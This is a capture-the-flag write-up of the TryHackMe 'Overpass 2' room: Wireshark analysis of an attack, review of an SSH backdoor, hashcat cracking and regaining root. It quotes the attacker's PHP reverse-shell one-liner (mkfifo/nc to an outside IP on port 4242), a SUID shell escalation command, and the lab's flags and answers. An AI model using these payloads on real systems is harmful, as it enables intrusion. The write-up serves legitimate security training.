![](Assets/Images/Pasted%20image%2020221207104937.png)

#  Task 1: Forensics - Analyse the PCAP

```
Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing [Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals) as a bare minimum.  

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc
```
![](Assets/Task_Files/overpass2.pcapng "Download Task File")


## Question 1:
#### What was the URL of the page they used to upload a reverse shell?
Opening the task file in Wireshark we can see on the 14th line a post request to `/development/`

![](Assets/Images/Pasted%20image%2020221207110324.png)

##### Answer: <details> <summary>Show Answer</summary> `/development/` </details> 

## Question 2:
#### What payload did the attacker use to gain access?

Looking further along the same HTTP stream found in the previous answer, the payload can be found.

![](Assets/Images/Pasted%20image%2020221207121421.png)

##### Answer: `?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?`

## Question 3: 
#### What password did the attacker use to privesc?

Using the Wireshark filter is really handy for finding specific keywords contained within packets such as "password". By filtering `tcp contains "password"` I was able to isolate the exact tcp packet stream and view its contents in plain text (as this is being transmitted via netcat).

![](Assets/Images/Pasted%20image%2020221207122714.png)

##### Answer: `whenevernoteartinstant`

## Question 4: 
#### How did the attacker establish persistence?

Looking further down the same stream we can see the attacker is using a ssh-backdoor payload which they cloned using the `git clone` command and saved it on the machine. 
They then utilized `ssh-keygen` to generate their own public/private rsa key pair and saved the key in `/home/james/.ssh/id_rsa` thus allowing the attacker to connect to the machine using SSH.

##### Answer: `https://github.com/NinjaJc01/ssh-backdoor`

## Question 5:
#### Using the fasttrack wordlist, how many of the system passwords were crackable?

We can see the attacker used `sudo cat /etc/shadow` to view the password hash for each of the users on the machine. All we need to do here is copy over this info into a text document and run it through John The Ripper using the fasttrack wordlist.

![](Assets/Images/Pasted%20image%2020221207124926.png)

##### Answer: `4`

# Task 2: Research - Analyse the code

Now that you've found the code for the backdoor, it's time to analyse it.

## Question 1:
#### What's the default hash for the backdoor?

The answer to this question can be found by investigating the code found in `ssh-backdoor/main.go`. An easy way to view this is by visiting the github account mentioned earlier and viewing the code directly from the repository. 

##### Answer: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

## Question 2:
#### What's the hardcoded salt for the backdoor?

The hardcoded salt for the backdoor was defined in line `108` in the same script mentioned above.

##### Answer: `1c362db832f3f864c8c2fe05f2002a05`

## Question 3:
#### What was the hash that the attacker used? - go back to the PCAP for this!

Found using the same stream as earlier.

##### Answer: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

## Question 4:
#### Crack the hash using rockyou and a cracking tool of your choice. What's the password?

Firstly we need to analyse which hashing algorithm was used in the attackers hash. There are many ways this can be done however in this case I used [Hash Analyzer](https://hashes.com/en/tools/hash_identifier "Hash Analyzer").

![](Assets/Images/Pasted%20image%2020221207135531.png)

So we now know that SHA512 is the likely hashing algorithm, we now need to format our password and salt accordingly as seen below in the following format `$pass.$salt`

![](Assets/Images/Pasted%20image%2020221207140508.png)

With this information we can now start cracking the hash.
In this case, my choice of tool was hashcat using the following command:
`hashcat -m 1710 hash:salt /usr/share/wordlists/rockyou.txt`

![](Assets/Images/Pasted%20image%2020221207150313.png)

##### Answer: `november16`

# Task 3:  Attack - Get back in!

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!


## Question 1:
#### The attacker defaced the website. What message did they leave as a heading?

![](Assets/Images/Pasted%20image%2020221207150823.png)


##### Answer: `H4ck3d by CooctusClan`

## Question 2:
#### Using the information you've found previously, hack your way back in!


##### Answer: `No answer needed`

## Question 3:
#### What's the user flag?

We can use the backdoor the attacker created to login to the machine.
Looking back at the TCP stream in Wireshark from earlier, note that the backdoor is running on port `2222`
![](Assets/Images/Pasted%20image%2020221207152634.png)

So in order to connect to the machine using SSH, we need to specify the port number `2222`. The backdoor doesn't require the username, only the password we discovered in task 2.

![](Assets/Images/Pasted%20image%2020221207152512.png)

From here its fairly easy to get the user flag as the `user.txt` file is located on directory up from our current working directory.

##### Answer: `thm{d119b4fa8c497ddb0525f7ad200e6567}
`

## Question 4:
#### What's the root flag?

Unfortunately we cannot immediately use `sudo` for anything as we don't know the current password for user `james` and it seems as though the user has changed their password sometime after the attacker got in.
I initially checked for binaries with the SUID bit set by running command `find / -perm -u=s -type f 2>/dev/null` and realised that the attacker left another backdoor to get root. 

![](Assets/Images/Pasted%20image%2020221207164606.png)

Notice that there is a hidden file in the users home directory `/home/james/.suid_bash`
As per gtfobins, we need to do now is execute the binary using the following command and we'll get our root shell `./.suid_bash -p`.

![](Assets/Images/Pasted%20image%2020221207164927.png)

No we we can capture our final flag!
Flag is located in `/root/root.txt`

##### Answer: `thm{d53b2684f169360bb9606c333873144d}`

## Conclusion

This room provided us with some unique perspectives as we're following in the footsteps of an attacker rather than carrying out the attack our selves. I thoroughly enjoyed working through this one so thank you for reading and I hope you've found this writeup helpful! 
